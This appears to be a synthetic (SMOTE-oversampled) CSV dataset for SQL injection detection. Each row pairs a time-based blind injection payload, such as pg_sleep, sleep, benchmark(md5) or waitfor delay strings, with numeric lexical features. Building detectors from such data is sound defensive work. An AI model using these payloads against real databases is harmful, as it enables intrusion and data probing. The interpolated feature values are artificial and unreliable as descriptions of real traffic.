id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000617,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.7678169736798408,75.44280668447652,26.402675417779783,3.6788752230391983,23.402675417779783,13.221403342238261,30.013377088898913,8.805350835559565,0.31280478262299144,0.17184122144410482,0.3987253933450439,0.11662860258785981,0.0,0.40267541777978244,2.0,0.0,0.0,1.4026754177797827,0.0,4.0,0.0,1.0,0.0,3.4026754177797827,0.0,0.40267541777978255,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4026754177797826,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4026754177797827
SMOTE_000618,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.2392805689381399,85.17370683953659,27.0,3.7111489849079202,25.91077523490248,16.61034528370729,32.65258632092682,10.0,0.3040009481282945,0.19517819781169096,0.38341142429193875,0.11740942976807581,0.0,1.521120518609767,1.652586320926822,0.0,0.0,1.8262931604634112,0.0,4.0,0.0,1.0,0.0,3.478879481390233,0.0,1.0,0.826293160463411,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8262931604634112,1.0,0.3474136790731781,0.826293160463411,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000619,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.9048767535797225,74.02543036095898,22.779011677291916,3.453914268075945,16.40222101912545,18.0,30.46740700637515,9.155802335458382,0.21986576110500777,0.2440428518795324,0.4122369924232421,0.12385439459221777,0.0,0.15580233545838323,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.1558023354583833,0.8441976645416167,4.0,0.0,0.15580233545838326,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1558023354583833,0.0,1.0,0.1558023354583833,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8441976645416167,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1558023354583833
SMOTE_000620,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,2.3595716169243914,62.99500948525274,24.749376185656594,3.852143262957234,21.746880928282962,11.498752371313184,21.250623814343406,8.498752371313184,0.34430824350272055,0.18231546297228723,0.33883815080756113,0.13453814271743114,1.498752371313185,0.25062381434340747,2.0,0.0,0.0,1.0,0.0,2.2506238143434074,0.0,0.0,0.0,3.0,0.7493761856565925,0.2506238143434075,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.2506238143434075,0.0,0.0,0.0,0.0,0.0,0.0,0.2506238143434075,0.0,0.7493761856565925,0.7493761856565925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000621,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,2.1147618352614037,79.1087481083828,23.854456028273773,3.5421925555321616,16.545380023561478,21.708912056547547,31.236304018849182,9.618152009424591,0.20901113158928136,0.27033394767844043,0.39850167340725984,0.12215324732501834,0.30907600471229546,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.309076004712296,0.0,0.0,1.0,4.0,0.30907600471229546,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3090760047122954,0.0,0.0,0.0,1.0,0.0,0.3090760047122955,0.6909239952877044,0.0,0.0,0.0,0.0,0.0,0.0,0.6909239952877045,0.3090760047122954,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000622,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,2.546285502458102,76.2520810764382,25.25041621528764,3.546326180262894,21.700499458345167,13.600665944460223,31.50083243057528,9.450083243057527,0.2857680212547197,0.17461922660265514,0.4134611827219764,0.1261515694206488,0.0,0.5499167569424721,2.0,0.0,0.0,1.4500832430575277,0.0,4.450083243057527,0.0,1.0,0.0,3.4500832430575277,0.0,0.5499167569424722,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4500832430575278,1.0,0.4500832430575278,0.5499167569424722,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4500832430575277
SMOTE_000623,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,2.537065873849333,67.18135713903263,24.279056121083084,3.5126984179923055,15.0,17.213923466382784,26.96743367264985,8.0,0.22564167694312992,0.2506211661062919,0.40339492924757553,0.12034222770300261,0.6558112242166168,-1.1102230246251565e-16,0.6883775515667665,0.0,0.0,1.0,0.0,4.655811224216617,0.0,0.0,1.0,1.6883775515667665,0.6558112242166168,0.0,0.34418877578338325,0.0,0.0,1.0,1.0,0.0,0.0,0.6558112242166168,0.0,0.0,0.0,0.0,0.0,0.34418877578338325,0.6558112242166168,0.0,0.0,0.0,0.0,0.0,0.0,0.34418877578338325,0.6558112242166168,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000624,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.6030066793379082,98.32732540110777,24.112112433148702,2.9568933323678306,31.12112433148704,1.8878875668512958,51.54253836906685,13.775775133702592,0.31727723979406797,0.019142632596509487,0.5235541492645711,0.1400259783448515,1.224224866297408,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,10.663662700553889,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.887887566851296,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.11211243314870406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.112112433148704
SMOTE_000625,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,2.2434885441727053,84.13189522272077,27.482471201081943,3.840290045134433,19.482471201081943,25.859769608655533,29.342240809737476,9.447413603245826,0.2344519003767239,0.30621923984931043,0.34751471399040595,0.11181414578355972,0.48247120108194164,-1.1102230246251565e-16,2.0,0.0,0.0,1.4824712010819416,0.0,4.482471201081942,0.0,0.0,1.0,3.4824712010819416,0.4824712010819417,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.48247120108194164,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4824712010819416
SMOTE_000626,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,1.5282029825982968,73.54255826479353,25.856395661983804,3.741139367287907,18.08511652958704,21.08511652958704,26.143604338016196,8.22872086760324,0.24568130933903232,0.28647941842417113,0.3558676359597148,0.11197163627708176,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.2287208676032395,0.0,4.0,0.0,0.0,1.0,3.2287208676032395,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7712791323967607,0.0,0.0,0.0,0.22872086760323943,0.0,0.7712791323967606,0.22872086760323937,0.0,0.0,0.0,0.0,0.0,0.0,0.2287208676032394,0.7712791323967607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2287208676032395
SMOTE_000627,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.7803691671273827,82.17081194104189,25.601638172885135,3.567650512001303,24.7236039803473,14.162621076616217,33.24393161492433,10.040655269154055,0.29949589196903903,0.16936613038769782,0.4063176817208713,0.12482029592239191,0.0,1.0,2.0,0.0,0.0,1.520327634577027,0.0,4.520327634577027,0.0,1.0,0.0,3.520327634577027,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.520327634577027,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5203276345770274
SMOTE_000628,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,2.162091909673572,67.96498593593975,17.75440762821757,2.922174120921858,24.105289153861087,1.3508815256435156,33.15793373079163,9.350881525643514,0.35469543424841016,0.019352729410771374,0.48730957803815617,0.13864225830266236,0.0,2.298236948712971,0.0,0.0,0.3508815256435146,0.6491184743564854,0.0,6.052644576930544,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,0.6491184743564854,1.0,0.0,0.0,0.0,0.0,1.3508815256435147,0.0,0.0,0.3508815256435146,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7017630512870294
SMOTE_000629,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.0292750739672878,79.52226198126517,25.42037699687753,3.2907512793374543,19.80679233229251,10.0,38.295092652095136,11.420376996877529,0.2508838783975857,0.126928152027312,0.47879146411344287,0.14339650546165947,0.8067923322925098,0.19320766770749015,2.0,0.0,0.0,1.0,0.0,6.420376996877529,0.0,1.0,0.0,3.0,0.8067923322925098,0.1932076677074902,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8067923322925098,0.19320766770749018,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000630,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.494158684640056,62.64860541283717,23.435139458716282,3.5441525699086527,17.152709188074425,12.25944216513487,25.389163247702307,7.847290811925577,0.281619851057,0.19191208687270808,0.4016662078005499,0.12480185426974198,0.0,0.7175697293581413,2.0,0.0,0.0,1.2824302706418587,0.0,3.5648605412837178,0.0,0.0,0.2824302706418587,3.282430270641859,0.0,0.7175697293581412,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000631,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.023373680248902,66.41790774703198,24.063430810273985,3.5542235008796013,20.41790774703198,10.0,27.354476936757994,8.645523063242006,0.3068503358669947,0.1506847095941316,0.4119860628136915,0.1304788917251823,0.0,0.6455230632420053,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.6455230632420053,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000632,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.709373820936442,76.72701978809481,25.262002328011153,3.3571761582369337,19.631001164005575,10.0,35.834016296078076,11.262002328011153,0.25827541088911404,0.1319331511717875,0.4626534394418753,0.1471379984972231,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.89300349201673,0.3689988359944234,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6310011640055766,0.3689988359944234,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000633,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.38322539009280104,77.98573884017495,22.197147768034988,3.2911845879993598,15.492869420087473,17.60570446393002,34.69001718812246,10.19714776803499,0.1979066625711757,0.227325739001133,0.4441847908581445,0.13058280756954674,0.0,0.19714776803498968,1.9014261159825052,0.0,0.0,1.9507130579912526,0.0,5.147860826026243,0.0,0.0,1.0,3.852139173973758,0.0,0.0492869420087475,0.9507130579912526,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9507130579912526,0.0,0.04928694200874739,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000634,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.9679566128866234,93.55911803971361,21.508445434244802,2.8321754519195608,27.8361484780816,2.0,50.542227171224006,13.180742390408001,0.29957285638387604,0.021552056961553545,0.5387903933130639,0.14008469334150644,0.0,0.8361484780816003,0.0,0.0,1.0,0.0,0.0,10.508445434244802,0.0,0.0,0.0,1.0000000000000002,0.0,0.8361484780816002,0.0,0.8361484780816002,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8361484780816004,0.1638515219183997,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000635,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.5092731353962665,68.29439036984222,25.47079277738166,3.634699084147006,22.294390369842215,10.0,27.823597592460555,8.176402407539445,0.3260963114855612,0.14650080185096495,0.40748836198978733,0.11991452467368652,0.0,0.1764024075394458,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.17640240753944592,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000636,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.2410508609464526,68.08421549501074,22.522104600665237,3.4696038023022515,15.783156900997852,15.911581597339058,27.911581597339058,8.477895399334765,0.23638500595679446,0.23053557409800657,0.4086519030599635,0.12442751688523548,0.0,0.2610523003326178,2.0,0.0,0.0,1.7389476996673823,0.0,3.7389476996673823,0.0,0.0,0.7389476996673823,3.7389476996673823,0.0,0.2610523003326178,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000637,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,2.118637545667059,88.28879693656128,21.516044274253403,2.924787490313757,28.0,2.0,46.22461983954766,12.064177097013616,0.32048984546212766,0.022892131818723405,0.5208771873676595,0.13574083535148937,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.548132822760213,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.5160442742534042,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000638,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.0099312753168894,79.95395255806699,21.953952558066995,3.093389077970092,28.476976279033497,2.0,39.0,10.476976279033497,0.3561034702482493,0.02502548343508708,0.48799692698419816,0.1308741193324655,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.23848813951674863,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.2384881395167486,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7615118604832514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.761511860483251
SMOTE_000639,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,2.08841348565914,90.83206699718636,22.224362390692686,2.9158891868031414,28.93461743441561,2.0,47.673087172078056,12.224362390692685,0.3215796273380589,0.022373187932699004,0.5227985219543927,0.1332486627748494,0.644872478138537,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.93461743441561,0.0,0.0,0.0,1.0000000000000002,0.6448724781385369,0.0,0.0,0.6448724781385369,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.35512752186146296,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.355127521861463
SMOTE_000640,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.5485389594534009,58.38401642715961,21.219437958376922,3.3651334915612643,15.43887591675384,10.109718979188461,24.780562041623078,8.05485948959423,0.26384471001706333,0.1730831661860304,0.4251119861366441,0.1379601376602622,0.10971897918846074,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.890281020811539,0.0,0.0,0.9451405104057697,3.0,0.054859489594230315,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05485948959423015,0.0,0.9451405104057697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9451405104057697,0.0,0.05485948959423024,0.05485948959423024,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0548594895942305
SMOTE_000641,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,2.2817581201335453,80.1032480753346,23.93953004708413,3.4517516951886456,18.491154084751432,18.0,33.612093990583176,10.0,0.2287654917335128,0.2252317088837245,0.42087407222513795,0.12512872715762474,0.0,0.38790600941682585,2.0,0.0,0.0,2.0,0.0,4.612093990583174,0.0,0.38790600941682585,0.6120939905831742,4.0,0.0,0.3879060094168258,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3879060094168258,0.0,1.0,0.38790600941682585,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6120939905831742,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3879060094168256
SMOTE_000642,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.6230476445438077,89.12069609844902,27.824139219689805,3.626545365856986,24.824139219689805,18.0,36.29655687875921,10.0,0.27858236958311855,0.20206895035659056,0.40708815208440724,0.11226052797588362,0.0,0.17586078031019636,2.0,0.0,0.0,2.0,0.0,4.824139219689803,0.0,1.0,0.0,4.0,0.0,0.17586078031019645,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8241392196898035,0.17586078031019645,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000643,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,2.0147745536437025,61.542096829715746,23.43223789628553,3.5577779410875583,18.56776210371447,10.0,24.838810518572345,8.135524207428936,0.3024574080909153,0.16317922583072672,0.40266830480563487,0.13169506127272312,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.5677621037144682,0.0,0.5677621037144684,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5677621037144684,0.0,0.43223789628553155,0.5677621037144684,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.43223789628553155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000644,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,3.067618703502427,63.967648164439474,21.852521166348495,3.401773242834103,15.852521166348495,13.836345248568232,26.278781749522743,8.0,0.2490257435779743,0.2114060207788704,0.4130694773374838,0.1264987583056715,0.0,-1.1102230246251565e-16,1.1474788336515038,0.0,0.0,1.0,0.0,4.426260583174248,0.0,0.0,1.0,2.147478833651504,0.0,0.0,0.5737394168257519,0.4262605831742481,0.0,1.0,1.0,0.0,0.0,0.4262605831742481,0.0,0.0,0.0,0.0,0.0,0.5737394168257519,0.42626058317424803,0.0,0.0,0.0,0.0,0.0,0.0,0.5737394168257519,0.4262605831742481,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000645,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.1403240237431451,58.95710733477431,23.755361583153213,3.6058934318872744,18.244638416846787,10.0,23.22319208423394,7.489276833693577,0.31004492786351673,0.17015625550668204,0.39316210187214573,0.1266367147576555,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.244638416846788,0.0,0.24463841684678808,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.244638416846788,0.0,0.7553615831532121,0.24463841684678805,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7553615831532119,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000646,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.3564659524958524,88.31963116657063,27.19330259721422,3.7412758752386233,34.033487013928905,11.546420777713752,32.54642077771375,10.193302597214219,0.38748134698242925,0.12930658225174138,0.3677128168865322,0.11549925387929716,0.0,3.420092208357343,0.3866051944284379,0.0,0.0,1.193302597214219,0.0,4.193302597214219,0.0,1.0,0.0,1.579907791642657,0.0,1.0,0.19330259721421894,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.19330259721421897,1.0,1.6133948055715623,0.19330259721421894,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
